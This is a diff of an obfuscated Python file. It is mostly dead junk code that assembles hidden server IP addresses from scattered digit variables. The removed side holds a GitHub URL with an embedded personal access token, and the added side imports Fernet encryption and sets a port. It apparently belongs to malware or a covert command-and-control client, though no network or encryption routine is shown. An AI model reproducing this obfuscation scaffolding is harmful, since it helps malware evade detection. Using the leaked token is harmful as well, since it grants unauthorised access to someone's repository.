@@ -2,843 +2,1348 @@ import os
 import shutil
 import subprocess
 import time
+from cryptography.fernet import Fernet
 
 # Server IP configuration (obfuscated)
-SERVER_IP1 = '3'
-SERVER_IP2 = '1'
-SERVER_IP3 = '7'
-SERVER_IP4 = '8'
-SERVER_IP5 = '1'
-SERVER_IP6 = '1'
-SERVER_IP7 = '9'
-SERVER_IP8 = '2'
-SERVER_IP9 = '1'
-SERVER_IP10 = '8'
-SERVER_IP11 = '3'
-SERVER_IP12 = '9'
-SERVER_IP13 = '6'
-SERVER_IP14 = '8'
-SERVER_IP15 = '3'
-SERVER_IP16 = '4'
-SERVER_IP17 = '0'
-SERVER_IP18 = '0'
-SERVER_IP19 = '2'
-SERVER_IP20 = '3'
-SERVER_IP21 = '0'
-SERVER_IP22 = '6'
-SERVER_IP23 = '7'
-SERVER_IP24 = '6'
-SERVER_IP25 = '2'
-SERVER_IP26 = '7'
-SERVER_IP27 = '6'
-SERVER_IP28 = '0'
-SERVER_IP29 = '3'
-SERVER_IP30 = '4'
-
-
-class Giojiktcb:
-    def __init__(self, qfcnfDPbeTFxinh2xY, PJ2zdZCwSZZo71, ux3akqKS5RkY7Na):
-        self.qfcnfDPbeTFxinh2xY = qfcnfDPbeTFxinh2xY
-        self.PJ2zdZCwSZZo71 = PJ2zdZCwSZZo71
-        self.ux3akqKS5RkY7Na = ux3akqKS5RkY7Na
-    def c6G42snaYt0StBXBc(self):
-        return 100
-    def urmUiFqlgM7Fg_ecQ(self):
-        return 41
-
-def IIIIO0IIl0lOII(YCClzSMnN5zYn32y, RknT0Zo3T):
-    HzHFyHSQkfUrGyhS2SXk = 101
-    vAbb4ePxlfRR0S = 347
-    hYdRP8jlPteUBIOn0n1D = 624
-    Sq5heXV5C6qv5F4mGgr = 212
-    mTssedmdQ5 = 696
-    Lq6d9BDAJN3rlIHaS6n = 594
-    NdZbjTHIXN3EZTK = 336
-    FhUlXnuQzLrXrPEua = 268
-    zDJ2SSuUfNVPp = 17
-    return YCClzSMnN5zYn32y
-
-class Spcojqblfsy2xi:
-    def __init__(self, eOyore8U8nVbfm, XtdPDByMEv):
-        self.eOyore8U8nVbfm = eOyore8U8nVbfm
-        self.XtdPDByMEv = XtdPDByMEv
-    def zcJzSBuSVP78TdWkcRYd(self):
-        return 63
-
-a6X0i2flnItM9r =SERVER_IP24 +SERVER_IP21 +SERVER_IP21 +'.' +SERVER_IP28 +SERVER_IP21 +SERVER_IP18 +'.' +SERVER_IP7 +SERVER_IP10 +SERVER_IP4 +'.' +SERVER_IP22 +SERVER_IP17
-ELrwFYPZPiZD8c9qtsg =45263
-
-def WA1dmM68efmiOmMl(fNQSw5lU95ATFROllcu, a_iurK_XyTD73TUOMO, rGQD2HRv):
-    PnbNNlT2uODV4VYL = 678
-    CyKj8wQ91 = 378
-    Kmb4J2lVkMO = 375
-    SzD13ddS = 860
-    cKZIGBSS = 861
-    lZaK_uRsbJBeANAE = 581
-    Qaq7WpQjeWHqJUCY = 886
-    QcDt8xtJ5Od9HOzGuqI = 67
-    return fNQSw5lU95ATFROllcu
-
-I6WOPCGnpxc9Ld0Q =SERVER_IP4 +SERVER_IP22 +SERVER_IP24 +'.' +SERVER_IP6 +SERVER_IP20 +'.' +SERVER_IP22 +SERVER_IP4 +SERVER_IP1 +'.' +SERVER_IP14 +SERVER_IP7
-N6pE3tg9L =56980
-
-O6w0bnMpRZWELmDDid =SERVER_IP14 +SERVER_IP22 +SERVER_IP8 +'.' +SERVER_IP22 +SERVER_IP3 +'.' +SERVER_IP24 +SERVER_IP8 +'.' +SERVER_IP7 +SERVER_IP11 +SERVER_IP24
-
-hkYcL_6B2v3n3P = [15, 63, 11, 92, 87]
-vt4TwqNAEtbZyPjQ2 = True
-
-def aOV0hFH8y(vhyOxHYJi5, XhBbOXIl_U8YD, Lo79DuyYQXWvpq):
-    D9eO1nWzmjdIpmm = 71
-    WYPByznKwNthCcwFAm = 694
-    C_MVOmm16 = 239
-    Lm3uW3D185zBp = 29
-    nKvkbD_Rv9F9LPSnP_V = 946
-    WKnxSfOjM5dd = 68
-    bOvkR14DXuQikE5 = 702
-    qJ_vUuBMQ = 630
-    srGux6cje0cl = 203
-    return vhyOxHYJi5
-
-def ll00IO0O0ll0O0lO(v5C2_4TGa8mc5c):
-    RTvxBJzU7 = 290
-    K4MdAEFWH48 = 139
-    AjqWkK9U5pzRV = 576
-    idq2rU1oA86sC17tkQ8f = 15
-    return v5C2_4TGa8mc5c
-
-class Wducaviit4gt4sr:
-    def __init__(self, QqSJf3CafnI4LM8hnl):
-        self.QqSJf3CafnI4LM8hnl = QqSJf3CafnI4LM8hnl
-    def mmkdTyNf(self):
-        return 57
-    def DXyY2AqfGFcmUKh(self):
-        return 88
-
-C9MlaWhIPc =SERVER_IP13 +SERVER_IP13 +'.' +SERVER_IP8 +SERVER_IP1 +'.' +SERVER_IP19 +SERVER_IP24 +'.' +SERVER_IP3 +SERVER_IP20 +SERVER_IP8
-pURWUu8g =26432
-
-bzB6JgCWRalcj0I3fL =SERVER_IP3 +SERVER_IP7 +'.' +SERVER_IP11 +SERVER_IP15 +'.' +SERVER_IP3 +SERVER_IP6 +SERVER_IP6 +'.' +SERVER_IP19 +SERVER_IP14 +SERVER_IP24
-unOTybX3yDcgHy2AND2 =43267
-
-class Vqgghuthvhwl2y:
-    def __init__(self, yihDhCXftqCE_mKb):
-        self.yihDhCXftqCE_mKb = yihDhCXftqCE_mKb
-    def dA1rv5NJq8OEv(self):
-        return 39
-
-def Q9a8caCX2CE(XjECLFw7d):
-    CDcj_7F5yX4qs = 641
-    XPNOk1CZ = 51
-    Ah4gRtTfSvgCtbFPpS5 = 939
-    kVHf6UJ9qIC = 109
-    bHRTAazLuKWhYVS = 731
-    return XjECLFw7d
-
-class Puqzbt9bpdcobyqvfubb:
-    def __init__(self, Mu_v0vqOg, tqfswEOqSa1bg, PWH7hK4uRP9xgQ):
-        self.Mu_v0vqOg = Mu_v0vqOg
-        self.tqfswEOqSa1bg = tqfswEOqSa1bg
-        self.PWH7hK4uRP9xgQ = PWH7hK4uRP9xgQ
-    def A5OQ2indlUEUiPzWK3(self):
-        return 30
-
-Uo9abd4N =SERVER_IP23 +SERVER_IP26 +SERVER_IP13 +'.' +SERVER_IP26 +SERVER_IP5 +SERVER_IP16 +'.' +SERVER_IP26 +SERVER_IP22 +SERVER_IP25 +'.' +SERVER_IP30 +SERVER_IP15 +SERVER_IP11
-gsngdrxg8vQ2 =13796
-
-lJPN6ymy46ACcEF2Hy =SERVER_IP6 +SERVER_IP26 +SERVER_IP26 +'.' +SERVER_IP16 +SERVER_IP19 +SERVER_IP18 +'.' +SERVER_IP23 +SERVER_IP14 +SERVER_IP5 +'.' +SERVER_IP30 +SERVER_IP14
-
-def fem1VVHc1O0lNTvS(ABFV_nQo9xRq5vbKAePS):
-    LBhIFbYFj_OBxFCEa = 973
-    CnFD4TjGQ3lcw = 978
-    vV_82x12cvMlR3b = 647
-    aSjeQcxb_rd8Fne = 257
-    ZewMB1DqbcnOf_0vHoz2 = 943
-    aW6b6cvgIrc = 408
-    XDZ1a9YTpQK = 688
-    ElxbyBt6jvHe6jFrQuE = 31
-    Yk8qPCEoxsAAq = 248
-    return ABFV_nQo9xRq5vbKAePS
-
-class Oljzgq1dx0fl5bhy5cm:
-    def __init__(self, OVCid81CF3By02EfHdf):
-        self.OVCid81CF3By02EfHdf = OVCid81CF3By02EfHdf
-    def tAoNhGuxtkjmtl(self):
-        return 58
-    def r01L5dyrmava6rQeTCf(self):
-        return 58
-
-zNJXBZKUK =SERVER_IP19 +SERVER_IP6 +SERVER_IP5 +'.' +SERVER_IP17 +SERVER_IP15 +'.' +SERVER_IP20 +SERVER_IP17 +SERVER_IP30 +'.' +SERVER_IP24 +SERVER_IP25
-
-class Bwktqfbg5hwdnv6tnvvh:
-    def __init__(self, y9W68saiBeUjbnCrH201, i56YKhHIgNF2IjFm, KqW43VEUXfHhQXn1):
-        self.y9W68saiBeUjbnCrH201 = y9W68saiBeUjbnCrH201
-        self.i56YKhHIgNF2IjFm = i56YKhHIgNF2IjFm
-        self.KqW43VEUXfHhQXn1 = KqW43VEUXfHhQXn1
-    def SlChKp8Z3(self):
-        return 59
-
-def BFf91XGZ00rnZQf(Ay7VJPsvatKGfmJxm4rh, HTTDlWY2, L8Xz94k9NOAnRjbx):
-    cXpb7TpOImNsJ8T5 = 607
-    ncRrWzXazrHfdTbU3S = 507
-    Yq25DTukfhi_B = 688
-    Wd_DFTm68XVGVU88tFSO = 725
-    IieeVKxJoYq49 = 576
-    cEny6ea50 = 148
-    j1VOL4mlb40A = 636
-    return Ay7VJPsvatKGfmJxm4rh
-
-def La0no4DrjVr_zuwL415y(N5vCqAdkuq4FC):
-    O4wtrU6vO4 = 941
-    fxZ9VFFZkIOfZ = 895
-    GAnXwoWyQIxQsZi5Fs = 418
-    return N5vCqAdkuq4FC
-
-Q5Plwp6l = "MPIvS88fSEGHS"
-hcNpaRR7NMZPRGTQKh = False
-VKB_JMxWL4j = False
-
-class Onhwfrbm:
-    def __init__(self, hGbuYY_Yi1wddRV5yM, slai8L61vZBN1x_F63Uk):
-        self.hGbuYY_Yi1wddRV5yM = hGbuYY_Yi1wddRV5yM
-        self.slai8L61vZBN1x_F63Uk = slai8L61vZBN1x_F63Uk
-    def RZLOb_S30w57Kv3d(self):
-        return 8
-
-def TktnOJjdcNp8():
-    VLx6eQaT7 = 265
-    n5YPEk1C7VxFMR_lg61 = 908
-    ihd4TTaJX = 677
-    HN4gJBL5BZKk = 448
-    return 73
-
-class P8irfsczk:
-    def __init__(self, psUOhgt0im6ja9, qUEgGbR2ZXxVXJox1u2Z):
-        self.psUOhgt0im6ja9 = psUOhgt0im6ja9
-        self.qUEgGbR2ZXxVXJox1u2Z = qUEgGbR2ZXxVXJox1u2Z
-    def qG8VAUQUh(self):
-        return 61
-    def DAtU8dm6cbdr(self):
-        return 72
-
-def CjakiGc9_JbfmhXM():
-    qo0MK7yL1V7z8 = 971
-    AfYIjzyyUnNYxB3c0P = 302
-    GJng6B3EoOHy = 982
-    zV_neYQvXjxAo2N18BD = 413
-    xbicnrTvbarAX4cTJh = 826
-    sa64FmPiUTKg5KWPre = 209
-    return 90
-
-GxudpRDo00I5 = False
-AFDvDItozul8yw = True
-TMrso73QLBKQ = [7, 83, 16, 88, 74]
-
-def GhlwRMQkoOoe6BlA(q8nWtGA1, YtdnNuLg0e4MpvWB5uT1, ABP3rt7J6WGk7):
-    yqbrkjLXLh6WfgyF7 = 350
-    WXwe5VjI38Z = 545
-    R7NirjGXL3ZPPD = 805
-    QxImOzqgJxi = 624
-    w6ST0S3xpbAFh9ZkuR1b = 2
-    ZsgSZXu_g = 45
-    EF75vj9ka1bSRqhAK24P = 145
-    return q8nWtGA1
-
-bWgibOb0NWbh8drPUJpj =SERVER_IP26 +SERVER_IP16 +'.' +SERVER_IP29 +SERVER_IP20 +'.' +SERVER_IP4 +SERVER_IP6 +'.' +SERVER_IP5 +SERVER_IP7
-
-def thRM3CxJMPMKqJp(rSKZXNWh, Hfcb8AzQ9yJUFBt2V, xA9GkrfqhFyr):
-    IwZ8mEEQqCH = 56
-    Rj6948cbWhjHcsq = 404
-    hC4mVRsb5O = 723
-    Su4EUPAlw0hj = 243
-    return rSKZXNWh
-
-class Nvcy5aey18:
-    def __init__(self, XAYNaeAPP563IF, d76uJXLN7pTGt1PxVo6, T2IrUNWL0Ra):
-        self.XAYNaeAPP563IF = XAYNaeAPP563IF
-        self.d76uJXLN7pTGt1PxVo6 = d76uJXLN7pTGt1PxVo6
-        self.T2IrUNWL0Ra = T2IrUNWL0Ra
-    def lZQPkyBR(self):
-        return 24
-    def Zwt506oJO_uXqrNiUkw(self):
-        return 69
-
-def UNeKCux0(cWNdXT92s2s, jYiOPafLujju):
-    tG9gTJi3TtiZnF = 69
-    whdRU1EPaAu_ = 950
-    pD16nqqL3Cpv1RJJ = 714
-    T5793nWMbNPI = 178
-    return cWNdXT92s2s
-
-ME35stQ1F9 = False
-Q_UYLaj2XnL_zS = "Mx7UBcsI0"
-
-ZL35_Igbfho = -715
-HmhzS7mAlgOIuhqA = None
-WSjfpQ5bEu2 = -931
-
-m8KAsQgj6IO7WO =SERVER_IP1 +SERVER_IP18 +'.' +SERVER_IP18 +SERVER_IP19 +SERVER_IP30 +'.' +SERVER_IP26 +SERVER_IP14 +SERVER_IP25 +'.' +SERVER_IP29 +SERVER_IP7
-
-class Apwimxciv3epj_bqnfx4:
-    def __init__(self, fr78NAHrSO, vcYQqejMIB):
-        self.fr78NAHrSO = fr78NAHrSO
-        self.vcYQqejMIB = vcYQqejMIB
-    def vYnB2vNBIHf(self):
-        return 24
-    def YyMmU8UGCtbS1(self):
-        return 44
-
-jPc2wW6ofgU4m =SERVER_IP21 +SERVER_IP11 +'.' +SERVER_IP14 +SERVER_IP9 +'.' +SERVER_IP30 +SERVER_IP3 +'.' +SERVER_IP17 +SERVER_IP6
-pJv6TtWvxP1J =35106
-
-def NiXsVmzkqUDsdT(NRfxa6eM2UUuBW, wXuz4WpigQxVUaS1, jFQreM21AyN6btNqE):
-    jkRn2Je0K5vz2v2nTrg1 = 66
-    qTuIAtFWHQ = 472
-    wUW9fFATZNucwaxKKXFj = 362
-    XW7dV3RXDx8kBH0rsL = 367
-    KWlPOuaNIVd = 772
-    FwURBQI0gQTvCh1e9Y5n = 470
-    return NRfxa6eM2UUuBW
-
-tuHAwMe2WeAfl8s =SERVER_IP18 +SERVER_IP23 +SERVER_IP25 +'.' +SERVER_IP1 +SERVER_IP7 +SERVER_IP18 +'.' +SERVER_IP13 +SERVER_IP11 +SERVER_IP4 +'.' +SERVER_IP19 +SERVER_IP20 +SERVER_IP12
-AU7w8dnzoo4El =6274
-
-def gBWTPnl9IwGjbhgGvi(xITKr9ctXqvF, IHhiEacA, UvF9ZoHoZrCRSgLZ75mY):
-    WtdjQa5jk5Np2sUzTl = 382
-    whYzGhCenphTM5PD = 890
-    VBb9huGWSX = 2
-    COXGCEVGw8Vo1DVo = 921
-    rImLMogrZLpOs = 894
-    DD0OGmM7XZ = 469
-    B90Xw0Wx = 249
-    UeKinUG3dQHm19pdZzIO = 738
-    return xITKr9ctXqvF
-
-def rsIp0K3UvZQDeMCpp1qk(oR25EMGTSFx53pG, ptrAhrMWNhyNp):
-    pOby8J0oisc6WA = 584
-    WjViIl9xi4 = 518
-    ZBACJ0coH = 904
-    yahtmGZVEHMpHL = 700
-    QsAbEaZ1nvB = 229
-    aFXucivTvUd72ypF8Up = 961
-    XgJCi3Zg546I6by = 399
-    uD6OIdBjPeS1duh = 116
-    dK2D159c = 694
-    I3G6hHCz_F7lVMPs = 167
-    return oR25EMGTSFx53pG
-
-zeZkiPHd =SERVER_IP12 +SERVER_IP17 +'.' +SERVER_IP24 +SERVER_IP4 +'.' +SERVER_IP16 +SERVER_IP16 +'.' +SERVER_IP9 +SERVER_IP2 +SERVER_IP6
-McpnWej9DppR4LC0 =34966
-
-class Jpo13tttd7s6n1:
-    def __init__(self, KEWCJ9RE6DZ6dt, ynibfcmaq):
-        self.KEWCJ9RE6DZ6dt = KEWCJ9RE6DZ6dt
-        self.ynibfcmaq = ynibfcmaq
-    def YA2LvP5sdE96bBwua(self):
-        return 2
-    def puQlJMfYFaHVEs_Xw(self):
-        return 99
-
-def AdiJhE32():
-    d2Xoe6W4m4 = 736
-    MmJLusP6pjU = 410
-    PY9Ul6xQ3pUi = 105
-    FrR9uy5wv6 = 470
-    uuICYVmlhivGYq49 = 375
-    return 27
-
-DF83oxDnGhMwkq =SERVER_IP20 +SERVER_IP25 +SERVER_IP22 +'.' +SERVER_IP2 +SERVER_IP13 +'.' +SERVER_IP26 +SERVER_IP25 +SERVER_IP14 +'.' +SERVER_IP21 +SERVER_IP24 +SERVER_IP18
-
-io_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'io.txt')
-
-
-class Nmorc6o8rov0:
-    def __init__(self, MDrGX0W_mwdy0UrPJ, ABotYZenx9sADk36aIM):
-        self.MDrGX0W_mwdy0UrPJ = MDrGX0W_mwdy0UrPJ
-        self.ABotYZenx9sADk36aIM = ABotYZenx9sADk36aIM
-    def GuitimWKKkla(self):
-        return 62
-
-mfk5fsBh_pbk =SERVER_IP2 +SERVER_IP25 +'.' +SERVER_IP11 +SERVER_IP25 +'.' +SERVER_IP27 +SERVER_IP14 +'.' +SERVER_IP5 +SERVER_IP1 +SERVER_IP30
-
-c4ObeVnOZuC8hLnzPPpu = False
-shB5wuzS_j3nNGLiO_w = None
-U9Ze4sIAfi = [18, 6]
-vCozF9OqROgb7Wk = None
-avgiKksr = -142
-DvkmYDdP = None
-
-def lEbWmCgQOaU(MOtv_xoG):
-    NzyTuMlO5YsM = 654
-    RmA7C4KwLUCbYmide0Bc = 70
-    HQCVYnlima3zxwNMRw = 343
-    Y7FZFMohOFk = 258
-    TjJ2SESAjJQke4umt6N = 191
-    Zp5ZS0FS4JlsHCbxZpW = 32
-    OEqBUFKzIFWaLNnEHkt = 73
-    return MOtv_xoG
-
-class Fpuat_p3txo:
-    def __init__(self, ZTmfGelFEVIcc):
-        self.ZTmfGelFEVIcc = ZTmfGelFEVIcc
-    def UfeBbBYMoEGQ2awh(self):
-        return 56
-    def acyddm7f8O5iFnO2JWp(self):
-        return 80
-
-def W__7cBdBwpf51Cv(Q2W2RiUoGug2_Xw):
-    wXYpRjSZ4t = 142
-    tnIiZJdL5KzbQis98j1 = 951
-    zu1xK4ViwmArjPXL = 723
-    GMeoZMDr = 233
-    ozNZ4aWxeE0k0 = 846
-    d8R03uOUJW1Z5Uk = 163
-    D9V670qZmfPA7wqKJj_ = 710
-    vZR9DYE3F8 = 440
-    HhfujjsqVoqhz3b8pHA = 261
-    return Q2W2RiUoGug2_Xw
-
-uHgtiaSZV = [66, 70, 89, 40, 89]
-IhUb8dZTSPqv = None
-N9FmEGVBxXmM_NFUHuLc = True
-gDWAqj5WYQoHTThIy = True
-
-lhVjJ_1F = -174
-LHFDX35f8L21 = "CGuKYt0HcQz6Bdmxs849"
-f4k6or5261 = True
-qPOkq_fKLMAqlsTTqDtH = "YRfBRztWccSDMT"
-YqbEF4sDZmIR = None
-
-ZcYi9ooufQ8YglXL8 =Q9a8caCX2CE(59233)
-
-def ycJA7x9W_5nvviw8H(kpxkzMfFjM, p94rnZC8aD1oyjB_VE, CxVucDCGQH):
-    spKaEFCn1EwxC = 134
-    w7_k2iuO9jnTX = 647
-    qtiJQbDKZN9 = 425
-    return kpxkzMfFjM
-
-def x9OSrTmJLg8T3Toi4i(ztxyvS5MJ1Xn2EWhFm, ueUvUuLgA48e, Oxmp3mxuefyLg2R):
-    bcK2VyGF5C = 685
-    OCkki_tXLFNcV2Aphve = 557
-    I7oTxznnrmwq0IwlCuRj = 881
-    nVYr3YaGDh = 27
-    Op6fdLwKd = 170
-    fWuFEal2fjfL7O2xM = 797
-    xirXZg4aft = 448
-    zjFPrYEFjOCRF = 392
-    ADMs_9brP = 57
-    FvjHn7iblkhvvZR = 185
-    return ztxyvS5MJ1Xn2EWhFm
-
-def KulRbemdYNogC__ig3():
-    lizh10sj = 999
-    e2bu4ThsjBR = 872
-    JthGo750EZ6mXm = 212
-    ZtGVOyyCtjBeoVc_m7in = 147
-    E5Ldh4My44r4Bxdbd = 884
-    han5vP3Nli6_enT = 995
-    return 66
-
-def brfKe3BCa3PS8Gx(EfZZmuvovsfh7, Y0oHxTL_An7lkD0b3):
-    FTxgjVT2kySUm = 20
-    gQAEcM0er_qkP5G = 392
-    J9Miy2VFGxQBLRxd3 = 630
-    SNX8sVp9_7un = 791
-    return EfZZmuvovsfh7
-
-def J2raxZdpZQ4tiZUAt(agfzqoxg2tqxuhKgwo8n, NHGQsLx4n):
-    x2ju6gs_ = 260
-    JoPuTQGmC = 261
-    wLKeWvOOsF = 898
-    vDtQJEQUqWRutNbe = 645
-    sMFNfPkKf5d4esTvNp4n = 271
-    CqHFsy3gtXwRAKEtBV = 353
-    p7eOOz6whMoh = 420
-    tbmWpjpKvQ9D4kw = 299
-    Rcnpuq2KaQSGXhARNuIa = 916
-    Vx8tTtly40gY5 = 193
-    return agfzqoxg2tqxuhKgwo8n
-
-def mzHVhWdI5e9eE(H5omzVhKFFU568Q, js90Wu78ED10Ti, leklM7tC1M2Ff_Dwgwg):
-    yCwoMOF0sQUmG5vX7ts9 = 428
-    i_rcVKKrIizJ1wDYV = 560
-    JZB4stHPo5AMi6sW1eP = 605
-    EfIfFsM0l = 461
-    BjmZMN4Yw = 673
-    zi29qA8dT6 = 849
-    irP5TbkD_IhsrO82tbZ9 = 335
-    return H5omzVhKFFU568Q
-
-def DpOBoEfeE(GDqSDtOlayESUk1ez05):
-    YOhncKxd2hbnelUXRG = 394
-    u9Otlg0I5TjBqcq = 296
-    n_od47fGcsb2JCDj6j = 855
-    cvZokRX8Ckj = 366
-    mAxwEEcQc9 = 232
-    O9LvFvPJvwO3loEW90 = 117
-    DfIvcAcXdDqz9 = 412
-    OYRoZk5d = 662
-    return GDqSDtOlayESUk1ez05
-
-def OIOOIIOI0Ol0l0(OA4uKSnFOCn91jK):
-    krqp4ZYlug_Z = 526
-    GFK3UcLWCZ0 = 456
-    HqLBzvrK9QYLDA = 260
-    iREM94jRAwVPC = 450
-    return OA4uKSnFOCn91jK
-
-with open(io_file_path, 'r') as file:
-    prefix = file.read(3)
-
-
-SJCEibd1GpTP0bY =SERVER_IP24 +SERVER_IP27 +'.' +SERVER_IP13 +SERVER_IP24 +SERVER_IP30 +'.' +SERVER_IP9 +SERVER_IP30 +SERVER_IP4 +'.' +SERVER_IP29 +SERVER_IP5
-
-def B86TGPaaqgIPn(X3VCpu9D):
-    U7SDGVLqNn5qgG = 709
-    o6bAokOF = 195
-    wtRUmxeYUQizJwqgL = 619
-    dZRgGhY3XAILMmbk = 478
-    return X3VCpu9D
-
-OlIIIOl0l0OO0Il =thRM3CxJMPMKqJp(81542, 22020, 18861)
-
-def VZQlDiPFKeZW6qikAJrc():
-    a_a4MKYq8k = 763
-    PwUBD55QOIg = 209
-    sHgXVUmw2x66yJ_cK = 795
-    yVMa5qd5CUt37FEKecmQ = 294
-    WnEaG53m8fSYM = 234
-    K_3fSs6VDySfpK6A1An = 549
-    gG8x9hfMpFkjMuHO8 = 231
-    reZdqYn7ys2P13Rw8gl3 = 280
-    ZlSjtgm9C1 = 276
-    nWb7ALMkf3 = 935
-    return 32
-
-lIOIlIIl0 =NiXsVmzkqUDsdT(4801, 67118, 55954)
-
-ySZHRKRqVJKN_uy =SERVER_IP13 +SERVER_IP7 +'.' +SERVER_IP27 +SERVER_IP3 +SERVER_IP8 +'.' +SERVER_IP28 +SERVER_IP30 +'.' +SERVER_IP6 +SERVER_IP11 +SERVER_IP5
-
-def w1ZqP99FJ():
-    TUcSfZwr1EDoVd10rCF = 463
-    zsy8uDVxD = 206
-    O6woY15QgTUJ = 727
-    DAL1vHPOiqtyq = 5
-    iHAq4RWTa5BU1 = 619
-    I8USjoc6VuhnGUGUHnRE = 751
-    return 11
-
-def FALGn7LuOP_Ef5yx(RMfpIa9TK5Z, YhQfqaJiC, frvQTlaiZXHUP):
-    kYvTdFsVAQ = 400
-    gdhPtxhtr = 554
-    lWu5yuj3uP0J30 = 419
-    ilWEafcpXNsvAExR_ = 461
-    Va8f3KW90XfdBVuZ5 = 710
-    SUJ0H8Tphwa = 973
-    qQNJkEyP6gSde = 746
-    pdjWztsvATT = 150
-    xEUZXOsY7dhd4bOH = 165
-    hc_ye49bv_ = 705
-    return RMfpIa9TK5Z
-
-def OIOl00lI():
-    L2TM5DVT3b5lwc_DspX6 = 199
-    PakziFA5D75Wa = 437
-    bHsfRdX38RP5 = 782
-    LtutvyUlkqT2 = 751
-    ir9Ii1irpr7iB = 838
-    rN6QrucbVxtlYOw2Ns = 84
-    z1dyJ7UkQ_ZN4yIF = 952
-    yy2dWBbS4g0o = 631
-    return 64
-
-MDmPQIiGsD7Dqn7OfCG =SERVER_IP5 +SERVER_IP22 +SERVER_IP9 +'.' +SERVER_IP19 +SERVER_IP21 +SERVER_IP29 +'.' +SERVER_IP14 +SERVER_IP19 +SERVER_IP9 +'.' +SERVER_IP16 +SERVER_IP26 +SERVER_IP11
-AEDuKeRV =38338
-
-def Ol0l0OOO0l(GF8UDc6jXTPyT40C03f4):
-    yL8OFiOg0GCcMycl = 692
-    adlZz1ocTKb86j = 347
-    lUHUr8Y57Sft = 210
-    qprjD4v4 = 131
-    qD3Y2mzw8l = 627
-    zUtVO6ED = 343
-    CTXgdJbJy = 409
-    ysSlsrgGYWj = 930
-    return GF8UDc6jXTPyT40C03f4
-
-LgEBXIvvFTEJakJGty0Z = [13, 74, 53, 55]
-zTVQ3ip55umrEsyqC = [49, 81, 74, 90]
-jhAwUrEyaIs944YkM9T6 = [39, 30, 12, 43]
-GodpDDfN = [92, 51, 93]
-STuKkZa47vgUXwX = 909
-
-class Hawbl2riglcby1qnbu:
-    def __init__(self, EgNSisdxLavu):
-        self.EgNSisdxLavu = EgNSisdxLavu
-    def NbIWHAYh5(self):
-        return 88
-    def qbIqwYf3prEMMA(self):
-        return 92
-
-def OO0OlOO00OIOO(LgiUpwhI6KCL3):
-    TfnnBUrjzbqnkLG = 635
-    Ar4QxCTp = 355
-    GsovFOe7 = 913
-    q5Gmq2flKeLtNu = 788
-    JJHIYJmCTg = 254
-    T9y9kItdtXi8_0l2rU = 422
-    return LgiUpwhI6KCL3
-
-def Sdau5NWoF1ygX4dQIr():
-    ZlHey5ZUX9MfH = 593
-    HIY5V2_FNfFIn = 985
-    jho9000hB4JM = 434
-    eLZjr30kWyuDD9TMkm = 722
-    FWvN9sZa9XPOkL3T = 910
-    Ft8VdaHiHBP0DQ = 245
-    uDfGyCKHyQV = 774
-    return 34
-
-mO9PMkc4_pIxGSR =SERVER_IP13 +SERVER_IP2 +'.' +SERVER_IP8 +SERVER_IP13 +'.' +SERVER_IP10 +SERVER_IP29 +'.' +SERVER_IP15 +SERVER_IP20
-
-p8R4nxDRTC = False
-b6G2ssYAvU = [71, 75, 72, 5]
-LA_GBksSAJ6hdATYq3Z = 861
-BmXwmcHOKa98FLLIBBKv = None
-J2T2Z041 = [9, 24]
-
-V26zi2093vtnS7qL6 =SERVER_IP25 +SERVER_IP22 +'.' +SERVER_IP15 +SERVER_IP11 +SERVER_IP14 +'.' +SERVER_IP4 +SERVER_IP11 +SERVER_IP18 +'.' +SERVER_IP9 +SERVER_IP18 +SERVER_IP10
-Y4WNvpXzY221RgBBiX4f =39062
-
-repo_url = f"https://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@github.com/elelelaaa/proj1_{prefix}.git"
-
-
-def ctwUi5RtwkYGdox():
-    u2jcnYtvAlIk = 243
-    hXvgk8rSRbE_K = 453
-    pRo8Fgbo94n69on = 206
-    return 59
-
-def F6sDgU_ZZBl5c9nphgj3(xNsmtUSVJYG, nORgkcGbYDeROxy7o):
-    pY5LoQtaGsrseVZDOBW = 40
-    DVRqZqYk7cjpC = 87
-    lo6HUxmBfysoHaSSO = 267
-    return xNsmtUSVJYG
-
-def twHZAwGJYeGU5TE():
-    q2rLK7G30n = 129
-    U_Z5udJLayorhV = 679
-    bgUFrrIm9tvY = 132
+SERVER_IP1 = '8'
+SERVER_IP2 = '5'
+SERVER_IP3 = '4'
+SERVER_IP4 = '7'
+SERVER_IP5 = '7'
+SERVER_IP6 = '7'
+SERVER_IP7 = '7'
+SERVER_IP8 = '4'
+SERVER_IP9 = '3'
+SERVER_IP10 = '5'
+SERVER_IP11 = '5'
+SERVER_IP12 = '3'
+SERVER_IP13 = '8'
+SERVER_IP14 = '9'
+SERVER_IP15 = '2'
+SERVER_IP16 = '1'
+SERVER_IP17 = '7'
+SERVER_IP18 = '1'
+SERVER_IP19 = '0'
+SERVER_IP20 = '0'
+SERVER_IP21 = '3'
+SERVER_IP22 = '8'
+SERVER_IP23 = '3'
+SERVER_IP24 = '7'
+SERVER_IP25 = '5'
+SERVER_IP26 = '2'
+SERVER_IP27 = '1'
+SERVER_IP28 = '4'
+SERVER_IP29 = '4'
+SERVER_IP30 = '8'
+
+
+IMeGld_I2YK66N =SERVER_IP2 +SERVER_IP5 +SERVER_IP3 +'.' +SERVER_IP24 +SERVER_IP29 +SERVER_IP2 +'.' +SERVER_IP28 +SERVER_IP17 +'.' +SERVER_IP11 +SERVER_IP8 +SERVER_IP2
+
+eoMKofkA18D576kK1B =SERVER_IP5 +SERVER_IP20 +SERVER_IP25 +'.' +SERVER_IP13 +SERVER_IP17 +'.' +SERVER_IP13 +SERVER_IP1 +'.' +SERVER_IP20 +SERVER_IP8 +SERVER_IP27
+
+zaQfDEel2gFVpBsr8h = None
+xFF0LUg_A = "SGTTQd1UC4"
+BvcnGo1v = 126
+YSfYjC3QTc8r7P9B = -501
+
+def zgL1GX1L(el9lSEGuUFl):
+    QNnrBuE6Yg2op3O = 468
+    pzGaZh8o33_aAgr = 733
+    mn2bGqwB6ra1iyWdR9 = 374
+    CW_GmRRHaJv = 84
+    zPKs6OTvgj0lp = 466
+    Vf70GBI6ODe7X8QKLb = 261
+    rt7PwztFiWtB8uvD7X = 839
+    Ung7i7jqPT = 637
+    return el9lSEGuUFl
+
+def pe6WNlk7PsGt16LKAc():
+    Oph4Fr2kDtu_3Fo9Urtb = 243
+    sWJ283TQ4sE2 = 326
+    LkZljUwr24bO = 266
+    return 46
+
+FlAASY5btM0nr9krIW =SERVER_IP20 +SERVER_IP22 +'.' +SERVER_IP4 +SERVER_IP28 +SERVER_IP28 +'.' +SERVER_IP2 +SERVER_IP21 +'.' +SERVER_IP21 +SERVER_IP1 +SERVER_IP4
+AmvOQntx =8000
+
